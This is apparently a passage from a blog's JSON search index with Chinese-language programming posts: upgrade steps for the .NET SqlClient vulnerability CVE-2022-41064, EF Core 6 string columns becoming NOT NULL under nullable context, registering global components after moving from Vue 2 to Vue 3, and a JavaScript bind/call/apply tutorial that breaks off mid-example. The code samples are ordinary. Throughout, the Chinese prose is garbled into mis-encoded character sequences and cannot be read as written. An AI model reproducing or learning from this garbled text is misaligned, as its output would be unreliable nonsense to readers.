1.1.4 # æˆ– dotnet add package System.Data.SqlClient --version 4.8.5 æˆ–è€…ç›´æ¥ä¿®æ”¹ .csprojï¼š(è‹¥å°ˆæ¡ˆå…ˆåƒç…§å…¶ä»–ç¨‹å¼åº«å†é–“æ¥åƒç…§ SqlClientï¼Œä¹Ÿéœ€è¦åŠ å…¥ PackageReference å¼·åˆ¶ä½¿ç”¨æ–°ç‰ˆ)\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;Project Sdk=\u0026#34;Microsoft.NET.Sdk.Web\u0026#34;\u0026gt; \u0026lt;PropertyGroup\u0026gt; \u0026lt;TargetFramework\u0026gt;net6.0\u0026lt;/TargetFramework\u0026gt; \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; \u0026lt;ImplicitUsings\u0026gt;enable\u0026lt;/ImplicitUsings\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;ItemGroup\u0026gt; \u0026lt;PackageReference Include=\u0026#34;Microsoft.Data.SqlClient\u0026#34; Version=\u0026#34;2.1.2\u0026#34; /\u0026gt; \u0026lt;/ItemGroup\u0026gt; \u0026lt;/Project\u0026gt; .NET Framework è«‹å®‰è£ November 2022 Security and Quality Rollup Updates for .NET Frameworkã€‚\n","date":"2022-11-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52491745274_95b2fa11ec_o.jpg","permalink":"https://wayneblog.ga/2022-11-11/dotnet-cve-2022-41064/","title":".NET SqlClient å®‰å…¨æ¼æ´ CVE-2022-41064 è§£è®€"},{"content":" åƒè€ƒç¶²ç«™\nå‡ç´š .NET 6 è¸©åˆ°çš„å°å•é¡Œç­†è¨˜ã€‚\nå‰æƒ…æè¦ ä¾ä¹‹å‰å­¸åˆ°çš„ EF Core Model è¨­è¨ˆï¼Œstring å±¬æ€§é è¨­å°æ‡‰çš„æ¬„ä½é è¨­ç‚º Nullableï¼Œæ¨™è¨» [Required] æ‰æœƒå®£å‘Šç‚º NOT NULLã€‚ ä¸éï¼Œé€™æ¢è¦å‰‡åˆ° .NET 6 å·²æœ‰æ‰€æ”¹è®Šã€‚æŸæ®µ EF Core å¯«å…¥è³‡æ–™åº«æ™‚å†’å‡ºæ¬„ä½ä¸å…è¨± NULLï¼Œä½† Model ä¸­è©²å±¬æ€§ä¸¦æœªå®£å‘Šç‚º [Required]ã€‚\nç ”ç©¶ç™¼ç¾é€™èˆ‡ .NET 6 å•Ÿç”¨ Nullable Context æœ‰é—œï¼Œcsproj å¤šäº† \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; è¨­å®šä»¥æ”¯æ´ C# 8 æ¨å‡ºçš„ Nullable Reference Type æ¦‚å¿µã€‚ è¨­ç‚º enable æ™‚ï¼ŒCompiler å•Ÿç”¨ Null Reference Analysis åŠç›¸é—œèªè¨€ç‰¹æ€§ï¼Œä»¥å­—ä¸²ç‚ºä¾‹ï¼Œè‹¥ string æ²’å®£å‘Šæˆ string? å»å¯èƒ½ç‚º null æ™‚æœƒå¾—åˆ°è­¦å‘Šï¼›è‹¥è¦æ˜ç¢ºæ¨™ç¤ºæ­¤è™•å°±æ˜¯è¦è¨­æˆ nullï¼Œå¯åœ¨å¾Œæ–¹åŠ ä¸Š Null-Forgiving Operatorï¼Œ ä¾‹å¦‚ string x = null!;ã€‚\nè‹¥ä¸æƒ³å•Ÿç”¨æ­¤ç‰¹æ€§ï¼Œè¨­æˆ disableï¼ŒCompiler å³æœƒæ¢å¾© C# 7.3 ä»¥å‰çš„è¡Œç‚ºã€‚\nEF Core ç”¢ç”Ÿè³‡æ–™åº«å°æ‡‰ SQL Schema æ™‚ï¼Œä¹Ÿæœƒå— Nullable Context å½±éŸ¿ï¼Œç•¶ \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt;ï¼Œå³ä½¿æœªåŠ  [Required]ï¼ŒModel çš„å­—ä¸²å±¬æ€§ä»æœƒè¢«è¦–ç‚ºä¸å¯ç‚º nullï¼Œåœ¨ CREATE TABLE æ™‚æœƒåŠ ä¸Š NOT NULLã€‚\nå•é¡Œé‡ç¾ ç”¨ä»¥ä¸‹ç¨‹å¼é‡ç¾å•é¡Œã€‚ç°¡å–®å®£å‘Šäº† Entity å‹åˆ¥ã€DbContextï¼Œå…¶ä¸­ RequiredText æœ‰åŠ è¨» [Required]ï¼Œå¦ä¸€å€‹ OptionalText å‰‡æ²’æœ‰ï¼Œå‘¼å« DbContext.DataBase.GenerateCreateScript() æª¢è¦–å…¶å°æ‡‰çš„ SQL Schemaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 using System.ComponentModel.DataAnnotations; using Microsoft.EntityFrameworkCore; var options = new DbContextOptionsBuilder\u0026lt;MyContext\u0026gt;() .UseSqlServer(\u0026#34;data source=(localdb)\\\\mssqllocaldb\u0026#34;) .Options; var dbCtx = new MyContext(options); Console.WriteLine(dbCtx.Database.GenerateCreateScript()); class MyContext : DbContext { public DbSet\u0026lt;Item\u0026gt; Items { get; set; } = null!; public MyContext(DbContextOptions\u0026lt;MyContext\u0026gt; options) : base(options) { } } public class Item //Entity å‹åˆ¥ { //æ…£ä¾‹ï¼Œå±¬æ€§åç¨±ç‚º Id æˆ– \u0026lt;type name\u0026gt;Id æœƒè‡ªå‹•æˆç‚º Entity çš„ Key public int ItemId { get; set; } [Required] public string RequiredText { get; set; } = null!; public string OptionalText { get; set; } = null!; } å¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œç•¶ \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; æ™‚ï¼ŒOptionalText ä¹Ÿæœƒè¢«åŠ ä¸Š NOT NULLï¼Œæ›æˆ disable æ‰æœƒæ¢å¾©ä¹‹å‰çš„è¦å‰‡ã€‚\næ‰€ä»¥ï¼Œ.NET 6 å•Ÿç”¨ Nullable Context æ™‚ï¼ŒModel å­—ä¸²å±¬æ€§è¦å…è¨± nullï¼Œå‹åˆ¥ä¹Ÿéœ€æ”¹æˆ string?ï¼Œé€™æ¨£æ‰æœƒå°æ‡‰æˆ Nullable è³‡æ–™åº«æ¬„ä½ã€‚(è¨»ï¼šRequiredText æ•…æ„æ‹¿æ‰ = null! è§¸ç™¼ CS8618 è­¦å‘Šï¼Œè­‰æ˜æœ‰è¨­ \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt;)\n","date":"2022-11-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52489392442_2208a4dc64_o.png","permalink":"https://wayneblog.ga/2022-11-10/efcore-6-string-not-null/","title":"Entity Framework Core 6.0 å­—ä¸²å±¬æ€§å°æ‡‰æ¬„ä½ NOT NULL å•é¡Œ"},{"content":" åƒè€ƒç¶²ç«™\nå‰æƒ…æè¦ åœ¨å°å°ˆæ¡ˆè£¡æˆ‘ä¸»è¦ç”¨ Vue.js ä¾†è™•ç† MVVMï¼Œç”¨ \u0026lt;script\u0026gt; è¼‰å…¥ vue.jsï¼Œå¯«å¹¾è¡Œ JavaScript æå®šï¼Œèµ°ä¸å¯«æ¨¡çµ„ï¼Œä¸ç”¨ TypeScriptï¼Œå…ç·¨è­¯æ‰“åŒ…çš„ã€Œè¼•å‰ç«¯ã€æ¨¡å¼ï¼Œä½†å¸¸ç”¨é‚è¼¯é‚„æ˜¯æœƒå¯«æˆå…ƒä»¶(Component)æ–¹ä¾¿å…±ç”¨ã€‚\nåœ¨ Vue 2 æ™‚ä»£ï¼Œæˆ‘ç¿’æ…£åœ¨ç¶²é å…±ç”¨çš„ .js è£¡ä½¿ç”¨ Vue.component(\u0026quot;my-component\u0026quot;, ...) è¨»å†Šå…ƒä»¶ï¼Œè¨»å†Šä¸€æ¬¡ï¼Œå„ç¶²é ä¸éœ€å®£å‘Šå°±èƒ½ä½¿ç”¨å…ƒä»¶ã€‚\næ­£å¼æ“ºè„« IE å¾Œï¼Œçµ‚æ–¼ä¸ç”¨å†æ­»å®ˆ Vue 2ï¼Œè©¦è‘—å°‡ä¸€å€‹å°å°ˆæ¡ˆå‡ç´šåˆ° Vue 3ï¼Œé‡åˆ°å°éº»ç…©ã€‚\nVue 3 æ”¹è®Šäº†å…ƒä»¶è¨»å†Šæ–¹å¼ï¼Œä¸å†æä¾›å…¨åŸŸè¨»å†Šï¼Œå¿…é ˆå…ˆ Vue.createApp() å»ºç«‹å¯¦é«”ï¼Œapp.component(\u0026quot;my-component\u0026quot;, ...) è¨»å†Šæˆ–ç”¨ components å±¬æ€§å¼•ç”¨æ‰èƒ½ä½¿ç”¨å…ƒä»¶ã€‚åƒè€ƒï¼šé‡æ–°èªè­˜ Vue.js - å…ƒä»¶çš„å®£å‘Šèˆ‡è¨»å†Š\nå…¨åŸŸå…ƒä»¶æ”¹æˆå€åŸŸå…ƒä»¶å¯æ¸›å°‘ç¨‹å¼é–“äº’ç›¸å¹²æ“¾ï¼Œåœ¨è»Ÿé«”æ¶æ§‹ä¾†èªªæ˜¯æ­£ç¢ºçš„æ–¹å‘ï¼Œä½†å°ç°¡å–®æ‡‰ç”¨ä¾†èªª(ä¾‹å¦‚ï¼šç¨‹å¼å¾ˆå–®ç´”ï¼Œå…¨åŸŸå…ƒä»¶æ‰“æ¶æ©Ÿç‡è¶¨æ–¼é›¶çš„å ´åˆ)ï¼Œé€™ç•ªèª¿æ•´è®“å…ƒä»¶è¨»å†Šè®Šå¾—ç¹ç‘£ã€‚\nç”¨å€‹ç¯„ä¾‹ä¾†èªªæ˜ã€‚\nVue 2 è¨»å†Šå¤šå€‹å…ƒä»¶ åŸæœ¬ Vue 2 åšæ³•æ˜¯åœ¨ my-components-vue2.js ä¸­è¨»å†Šå¤šå€‹å…ƒä»¶ï¼š\nmy-components-vue2.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Vue.component(\u0026#39;date-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }); Vue.component(\u0026#39;time-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }); Vue.component(\u0026#39;host-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }); å¦‚æ­¤ï¼Œæ•¸åæ”¯ HTML åªéœ€è¼‰å…¥ my-components-vue2.js ä¾¿èƒ½åœ¨ç¶²é ä½¿ç”¨ \u0026lt;date-tag\u0026gt;ã€\u0026lt;time-tag\u0026gt; æ’å…¥å…ƒä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = new Vue({ el: \u0026#39;#app\u0026#39; }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å‡ç´š Vue 3 ä¹‹å¾Œ å‡ç´š Vue 3 ä¹‹å¾Œï¼Œå…ƒä»¶çš„ js è·Ÿç¶²é éƒ½è¦åšä¸€äº›ä¿®æ”¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var dateTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }; var timeTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }; var hostTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }; å»ºç«‹ app å¯«æ³•æ”¹ç‚º Vue.createAppï¼Œä¸¦åœ¨å®£å‘Šä¸­é€é components åˆ—èˆ‰è¦è¨»å†Šçš„ç‰©ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue3-upgrade.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = Vue.createApp({ components: { \u0026#39;date-tag\u0026#39;: dateTag, \u0026#39;time-tag\u0026#39;: timeTag, \u0026#39;host-tag\u0026#39;: hostTag } // è‹¥å…ƒä»¶ç‰©ä»¶åç¨±èˆ‡æ¨™ç±¤ç›¸ç¬¦ï¼Œå¯ç°¡å¯«æˆ // components: { dateTag, timeTag, hostTag } }) .mount(\u0026#39;#app\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å‡è¨­æˆ‘æœ‰ 30 å€‹ç¶²é ï¼Œ30 å€‹ app éƒ½è¦åŠ  components: { dateTag, timeTag, hostTag }ï¼Œæœªä¾†è‹¥æ–°å¢å…¶ä»–å…ƒä»¶ï¼Œæ‰€æœ‰ components åˆ—èˆ‰éƒ½è¦æ”¹ï¼Œé€™æ˜¯æ¨™æº–çš„ã€ŒCopy \u0026amp; Paste è² é¢æ•™æã€å‘€ï¼Œä¸€æƒ³å°±è¦ºå¾—å¾ˆä¸ OK å‘€ã€‚\né€™ç¨®æƒ…å¢ƒï¼Œå°±æ˜¯å¥—ä»¶(Pluginï¼Œä¹Ÿæœ‰äººç¿»æˆæ’ä»¶ã€å¤–æ›)ä¸Šå ´çš„æ™‚åˆ»ã€‚æœ€ç°¡å–®çš„å¥—ä»¶å¯«æ³•æ˜¯å¯«ä¸€å€‹ functionï¼Œæ¥æ”¶ app åŠ options åƒæ•¸ï¼Œå…§éƒ¨å‘¼å« app.component(...) é€ä¸€è¨»å†Šå…ƒä»¶ï¼Œoptions å‰‡æ˜¯è‡ªè¨‚åƒæ•¸ï¼Œå¯ç”¨ä¾†æ±ºå®šè¦è¨»å†Šå“ªäº›å…ƒä»¶æˆ–è®Šæ›´å…ƒä»¶è¨­å®šå€¼ï¼Œæé«˜é‹ç”¨å½ˆæ€§ã€‚ä»¥ä¸‹æ˜¯ç°¡å–®ç¤ºç¯„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function myComponentsPlugin(app, options) { app.component(\u0026#39;date-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }); app.component(\u0026#39;time-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }); app.component(\u0026#39;host-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }); } å¦‚æ­¤ï¼Œå‘¼å«ç«¯å¯ç°¡åŒ–ç‚º .use(myComponentsPlugin)ï¼Œä¸éœ€æŠŠæ‰€æœ‰å…ƒä»¶åˆ—å‡ºä¾†ï¼Œæœªä¾†è¦æ–°å¢å…ƒä»¶ï¼Œä¿®æ”¹ my-components-vue3.js å³å¯ï¼Œä¿ç•™åŸå…ˆå…¨åŸŸå…ƒä»¶çš„ç°¡å–®æ–¹ä¾¿ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue3.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = Vue.createApp({ //... }).use(myComponentsPlugin) .mount(\u0026#39;#app\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2022-11-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52489820266_b81b766288_o.png","permalink":"https://wayneblog.ga/2022-11-10/vue-2to3-global-component/","title":"Vue 2 å‡ç´š Vue 3 ä¹‹å…¨åŸŸå…ƒä»¶è¨»å†Šå•é¡Œ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nä½¿ç”¨ bindã€callã€apply æ”¹è®Š this æŒ‡å‘çš„å°è±¡ å¦‚æœæƒ³è¦æ”¹è®Š this æŒ‡å‘çš„å°è±¡ï¼Œå¯ä»¥é€é bindã€callã€apply é€™ä¸‰å€‹ method è¾¦åˆ°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 const person = { userName: \u0026#39;Blueberry\u0026#39; } // æ¥è‘— create ä¸€å€‹å‡½å¼ä¾†å‘¼å« person çš„ userNameï¼š function callName() { console.log(\u0026#39;Hello \u0026#39; + this.userName); } // å‘¼å« callNameï¼š callName(); outputï¼š 1 \u0026gt; Hello undefined å› ç‚º callName() å‡½å¼ä¸­çš„ this æŒ‡å‘çš„æ˜¯ global objectï¼ˆä¹Ÿå°±æ˜¯ Window ç‰©ä»¶ï¼‰ï¼Œæ‰€ä»¥é€™æ™‚å€™æˆ‘å€‘å¸Œæœ›æŠŠ callName() çš„ this æŒ‡å‘ person é€™å€‹å°è±¡ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š\nbind MDN web docs\n1 function.bind(thisArg[, arg1[, arg2[, ...]]]) bind å’Œå…¶ä»–å…©å€‹æ–¹æ³•ï¼ˆcallã€applyï¼‰çš„ä¸åŒæœ‰å…©é»ï¼š\nbind æ˜¯å‰µé€ ä¸€å€‹å‡½å¼ç‰©ä»¶çš„æ‹·è²ï¼Œä¸æœƒåŸ·è¡Œå‡½å¼ï¼Œå› æ­¤ bind ä¹‹å¾Œé‚„è¦å†å¦å¤–å¯«åŸ·è¡Œå‡½å¼çš„å‹•ä½œï¼›è€Œ callã€apply æ˜¯ç›´æ¥åŸ·è¡Œå‡½å¼ã€‚ bind å¾Œé¢å‚³å…¥çš„åƒæ•¸å€¼æœƒè¨­å®šç‚ºæ‹·è²å‡½å¼çš„æ°¸ä¹…åƒæ•¸å€¼ï¼Œä¹‹å¾ŒåŸ·è¡Œæ‹·è²å‡½å¼æ™‚ï¼Œç„¡è«–æ€éº¼çµ¦äºˆåƒæ•¸éƒ½æ²’æœ‰ç”¨ï¼›è€Œ callã€apply å‰‡æ˜¯å–®ç´”çµ¦äºˆåƒæ•¸ï¼Œåƒä¸€èˆ¬å‘¼å«å‡½å¼é‚£æ¨£ã€‚ æˆ‘å€‘å…ˆå–®ç´”å°±ç¬¬ä¸€é»ä¾†èªªæ˜ï¼Œç¤ºç¯„æœ€åŸºæœ¬çš„ bind æ€éº¼å¯«ã€‚\nç¬¬ä¸€ç¨®å¯«æ³• 1 callName.bind(person)(); ä¹Ÿç­‰æ–¼ï¼š\n1 2 const callFunction = callName.bind(person); // å‰µé€ å‡½å¼ç‰©ä»¶çš„æ‹·è² callFunction(); // åŸ·è¡Œå‡½å¼ outputï¼š 1 \u0026gt; Hello Blueberry ç¬¬äºŒç¨®å¯«æ³•ï¼Œç›´æ¥å¯«åœ¨å‡½å¼è¡¨ç¤ºå¼å¾Œé¢ä¹Ÿå¯ä»¥ 1 2 3 4 5 const callName = function() { console.log(\u0026#39;Hello \u0026#39; + this.userName); }.bind(person); callName(); outputï¼š 1 \u0026gt; Hello Blueberry æ¥ä¸‹ä¾†é‡å°ç¬¬äºŒé»ä¾†èªªæ˜ï¼Œå…ˆä¾†æ”¹å¯«ä¸€ä¸‹ callName å‡½å¼ï¼ŒåŠ å…¥å…©å€‹ argumentsï¼š\n1 2 3 4 5 function callName(age, interest) { console.log(\u0026#39;Hello \u0026#39; + this.userName); console.log(\u0026#39;Your age is \u0026#39; + age); console.log(\u0026#39;Your interest is \u0026#39; + interest); } æ¥è‘—æˆ‘å€‘é™¤äº†è¦ç”¨ bind å°‡ this æŒ‡å‘ person ä¹‹å¤–ï¼Œé‚„è¦çµ¦äºˆ age å’Œ interest é€™å…©å€‹åƒæ•¸ã€‚\né€™é‚Šæœ‰å…©ç¨®åšæ³•ï¼šå–®ç´”çµ¦å®šåƒæ•¸ï¼Œæˆ–ç¶å®šæ°¸ä¹…åƒæ•¸å€¼ã€‚\nå–®ç´”çµ¦å®šåƒæ•¸ è¦å–®ç´”çµ¦å®šåƒæ•¸çš„è©±ï¼Œåƒä¸€èˆ¬åŸ·è¡Œå‡½å¼é‚£æ¨£ï¼Œåœ¨åŸ·è¡Œå‡½å¼æ™‚å†çµ¦äºˆåƒæ•¸å°±å¯ä»¥äº†ã€‚\n1 2 const callFunction = callName.bind(person); callFunction(24, \u0026#39;Reading books\u0026#39;); outputï¼š 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books ç¶å®šæ°¸ä¹…åƒæ•¸å€¼ å¦‚æœå°‡åƒæ•¸æ”¾åœ¨ bind ä¸­ï¼Œé€™å€‹å‡½å¼æ‹·è²ç‰©ä»¶çš„åƒæ•¸å€¼å°±æœƒæ°¸é è¢«å›ºå®šä½ã€‚\n1 2 const callFunction = callName.bind(person, 24, \u0026#39;Reading books\u0026#39;); callFunction(30, \u0026#39;Playing games\u0026#39;); // é€™é‚Šç„¡è«–å†æ€éº¼çµ¦åƒæ•¸éƒ½æ²’ç”¨ outputï¼š 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books call MDN web docs\n1 function.call(this, arg1, arg2..., argn) call å’Œ bind ä¸åŒï¼Œå®ƒæœƒç›´æ¥åŸ·è¡Œå‡½å¼ï¼Œå¾Œé¢çµ¦çš„åƒæ•¸ä¹Ÿä¸æœƒè¢«å›ºå®šä½ã€‚\n.call() å­˜åœ¨æ–¼ä»»ä½•ä¸€å€‹å‡½æ•¸æˆ–è€…æ–¹æ³•ä¸Šï¼Œæ˜¯å€‹ function å°±å¯ä»¥èª¿ç”¨ .call()ã€‚\n1 callName.call(person, 24, \u0026#39;Reading books\u0026#39;); outputï¼š 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books ä¿®æ”¹ this æŒ‡å‘ å°æ–¼æ²’æœ‰å®šç¾©åœ¨ä»»ä½•å°åƒä¸Šçš„ functionï¼Œå¯¦éš›ä¸Šä¹Ÿæœ‰ this æŒ‡å‘ï¼ŒæŒ‡å‘çš„æ˜¯å€‹å…¨å±€å°è±¡ã€‚ å°æ–¼å®šç¾©åœ¨æŸå€‹ object ä¸Šé¢çš„æ–¹æ³•ï¼Œthis æŒ‡å‘ï¼Œå¾ˆå¥½ç†è§£ã€‚ ä¸‹é¢æ‹¿ä¸€å€‹å°è±¡è®Šæ•¸åšä¾‹å­ï¼Œä¾†èªªæ˜å•é¡Œï¼š\n1 2 3 4 5 6 7 8 let sunan = { c: 3, test: function (a, b) { return a + b + this.c; } } console.log(sunan.test(1, 2)); // 6 console.log(sunan.test.call({ c: 4 }, 1, 2)); // 7 åœ¨é€™å€‹ä¾‹å­è£¡é¢ï¼Œ.call() çš„ç¬¬ä¸€å€‹åƒæ•¸å‚³å…¥äº†ä¸€å€‹æ–°çš„å°è±¡ï¼Œå®ƒè¦†è“‹äº†åŸæœ‰çš„æ•¸æ“šã€‚c å±¬æ€§ç”± 3 è®Šæˆäº† 4ï¼Œè€Œ test æ–¹æ³•ä¾ç„¶å­˜åœ¨ã€‚\noutputï¼š 1 2 \u0026gt; 6 \u0026gt; 7 apply MDN web docs\n1 function.apply(this, [arg1, arg2..., argn]) apply çš„å¯«æ³•è·Ÿ call å¾ˆç›¸è¿‘ï¼Œèˆ‡ call ä¸åŒçš„æ˜¯ï¼Œå¾Œé¢çš„åƒæ•¸éœ€è¦ä½¿ç”¨é™£åˆ—å‚³éï¼Œé©åˆæ­é… arguments é‹ç”¨åœ¨ç®—æ•¸çš„å‡½å¼ã€‚\n1 callName.apply(person, [24, \u0026#39;Reading books\u0026#39;]); outputï¼š 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books åŒä¸€å€‹ä¾‹å­çš„ call èˆ‡ apply å¯«æ³•æ¯”è¼ƒ 1 2 callName.call(person, 24, \u0026#39;Reading books\u0026#39;); callName.apply(person, [24, \u0026#39;Reading books\u0026#39;]); ä¿®æ”¹ this æŒ‡å‘ å’Œ .call() ä¸€æ¨£ï¼Œ.apply() çš„ç¬¬ä¸€å€‹åƒæ•¸ä¹Ÿæ˜¯ä¿®æ”¹ this æŒ‡å‘çš„ã€‚ å¯èƒ½çš„éŒ¯èª¤ ä¹Ÿè¨±æœƒç¢°åˆ°ä¸‹é¢çš„éŒ¯èª¤æç¤ºä¿¡æ¯ï¼š\n1 TypeError: CreateListFromArrayLike called on non-object è§£æ±ºæ–¹æ¡ˆå°±æ˜¯æŠŠåƒæ•¸æ‰“åŒ…æˆæ•¸çµ„[]ï¼Œé€²è¡Œå‚³éã€‚\nä½¿ç”¨æƒ…å¢ƒ function borrowingï¼š å€Ÿç”¨ function function borrowing å°±æ˜¯å€Ÿåˆ¥äººå‡½å¼ä¸­çš„æ–¹æ³•ä¾†ç”¨çš„æ„æ€ï¼Œä¸‹é¢ç¤ºç¯„ somebody å€Ÿç”¨ person çš„ getUserName æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const person = { userName: \u0026#39;Blueberry\u0026#39;, getUserName: function() { console.log(this.userName); } } const somebody = { userName: \u0026#39;Fan\u0026#39; } // with bind() const newUser = person.getUserName.bind(somebody); newUser(); // with call() person.getUserName.call(somebody); // with apply() person.getUserName.apply(somebody); outputï¼š 1 2 3 \u0026gt; Fan \u0026gt; Fan \u0026gt; Fan function curryingï¼š æ‹·è² function function currying çš„å®šç¾©ç‚ºå»ºç«‹ä¸€å€‹å‡½å¼çš„æ‹·è²ï¼Œä¸¦è¨­å®šé è¨­çš„åƒæ•¸ï¼Œé€™åœ¨æ•¸å­¸é‹ç®—ä¸‹å¾ˆæœ‰ç”¨ã€‚ä¸‹é¢æˆ‘å€‘å°±åˆ©ç”¨ bind çš„ç‰¹æ€§ä¾†å®Œæˆ function curryingã€‚\n1 2 3 4 5 6 const mutiply = function (a, b) { return a * b; } const mutiplyByTwo = mutiply.bind(this, 2); console.log(mutiplyByTwo(4)); outputï¼š 1 \u0026gt; 8 ä¸Šé¢æˆ‘å€‘å»ºç«‹äº†ä¸€å€‹å‡½å¼ mutiply(a, b)ï¼Œä¸¦ç”¨ bind å»ºç«‹å‡½å¼ç‰©ä»¶æ‹·è² mutiplyByTwo()ã€‚\nmutiply.bind(this, 2) é€™é‚Šçš„ this ä¸¦ä¸é‡è¦ï¼Œå› ç‚ºå‡½å¼è£¡æ²’æœ‰ä½¿ç”¨åˆ° thisã€‚\nè€Œå¾Œé¢çš„ 2 å‰‡æ˜¯æ°¸ä¹…ç¶å®šäº†åƒæ•¸ aã€‚\nç‚ºäº†è®“ç¨‹å¼ç¢¼æ¯”è¼ƒå¥½ç†è§£ï¼Œé€™é‚Šå°‡ä¸Šé¢é‚£æ®µç¨‹å¼ç¢¼æ‹†è§£ï¼Œå®ƒä¹Ÿç­‰æ–¼ï¼š\n1 2 3 4 5 6 7 8 const mutiply = function 